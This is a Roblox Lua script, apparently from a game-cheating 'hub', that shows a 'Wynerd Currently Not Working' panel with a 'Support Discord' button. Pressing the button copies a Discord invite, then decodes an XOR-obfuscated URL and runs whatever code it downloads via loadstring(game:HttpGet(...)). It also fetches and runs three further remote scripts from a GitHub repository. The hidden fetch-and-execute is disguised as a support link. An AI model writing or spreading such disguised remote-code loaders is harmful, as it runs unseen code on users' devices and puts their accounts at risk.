if not game:IsLoaded() then
    game.Loaded:Wait()
end

local function executor()
    local v0 = string.char
    local v1 = string.byte
    local v2 = string.sub
    local v3 = bit or bit32
    local v4 = v3.bxor
    local v5 = table.concat
    local v6 = table.insert

    local function v7(v8, v9)
        local v10 = {}
        for v11 = 1, #v8 do
            v6(v10, v0(v4(v1(v2(v8, v11, v11 + 1)), v1(v2(v9, 1 + (v11 % #v9), 1 + (v11 % #v9) + 1))) % 256))
        end
        return v5(v10)
    end

    local success, err = pcall(function()
        loadstring(game:HttpGet(v7("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\216\46\241\237\158\81\230\218\217\42\244\181\136\19\208\202\213\106\241\162\197\17\195\205", "\126\177\163\187\69\134\219\167"), true))()
    end)

    if not success then
        warn("Error in executor: " .. tostring(err))
    end
end

local function protectlua()
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GalacticHypernova/Guardian/main/MainProd"))()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GalacticHypernova/Guardian/main/CodexTest"))()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GalacticHypernova/Guardian/main/Main"))()
    end)

    if not success then
        warn("Error loading scripts in protectlua: " .. tostring(err))
        game:GetService('StarterGui'):SetCore("SendNotification", {
            Title = "Error",
            Text = "Failed to load protectlua scripts.",
            Duration = 5
        })
    else
        print("protectlua loaded successfully.")
    end
end

local function sendNotification(title, text)
    game:GetService('StarterGui'):SetCore('SendNotification', {
        Title = title,
        Text = text,
        Icon = 'http://www.roblox.com/asset/?id=8904334671',
        Duration = 5,
    })
end

-- Create GUI
local screenGui = Instance.new("ScreenGui")
local frame = Instance.new("Frame")
local titleLabel = Instance.new("TextLabel")
local messageLabel = Instance.new("TextLabel")
local destroyButton = Instance.new("TextButton")
local discordButton = Instance.new("TextButton")
local uiCorner = Instance.new("UICorner")

screenGui.Name = "NotificationGui"
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

frame.Size = UDim2.new(0.4, 0, 0.2, 0)
frame.Position = UDim2.new(0.3, 0, 0.4, 0)
frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
frame.BorderSizePixel = 0
frame.Parent = screenGui
uiCorner.Parent = frame

titleLabel.Size = UDim2.new(1, 0, 0.3, 0)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.Text = "------< Wynerd Currently Not Working >--------"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextScaled = true
titleLabel.BackgroundTransparency = 1
titleLabel.Parent = frame

messageLabel.Size = UDim2.new(1, 0, 0.4, 0)
messageLabel.Position = UDim2.new(0, 0, 0.3, 0)
messageLabel.Text = "We've disconnected. Feel free to check out [Alwi Hub Leakers Wynerd] > Redblues [Remake Version Wyvern] > [Chelpus Official Real Credit]. [Reminder This Script Paid But Free]"
messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
messageLabel.TextScaled = true
messageLabel.BackgroundTransparency = 1
messageLabel.Parent = frame

destroyButton.Size = UDim2.new(0.45, 0, 0.2, 0)
destroyButton.Position = UDim2.new(0.05, 0, 0.7, 0)
destroyButton.Text = "[Destroy UI]"
destroyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
destroyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
destroyButton.Parent = frame
destroyButton.MouseButton1Click:Connect(function()
    print("Destroy UI button clicked!")
    screenGui:Destroy()
end)

discordButton.Size = UDim2.new(0.45, 0, 0.2, 0)
discordButton.Position = UDim2.new(0.5, 0, 0.7, 0)
discordButton.Text = "[Support Discord]"
discordButton.BackgroundColor3 = Color3.fromRGB(0, 0, 150)
discordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
discordButton.Parent = frame
discordButton.MouseButton1Click:Connect(function()
    sendNotification('Loading...', 'Welcome User ' .. game.Players.LocalPlayer.Name)
    wait(3.5) 
    if true then 
        sendNotification('Wyborn', 'Connecting to support... Checking Age acc: ' .. game.Players.LocalPlayer.AccountAge)
        setclipboard("discord.gg/alwihub = https://discord.gg/cpXUTmMXXd") 
        wait(1)
        executor() 
        wait(2) 
        if true then 
            screenGui:Destroy()
            wait(1)
            sendNotification('Wyborn', 'Executor Protect = true or nil')
            protectlua() 
        end
    end
end)

local UserInputService = game:GetService("UserInputService")
local dragging = false
local dragStart = nil
local startPos = nil

local function updateInput(input)
    if dragging then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end

frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
    end
end)

frame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

UserInputService.InputChanged:Connect(updateInput)

print("Successfully loaded script.")
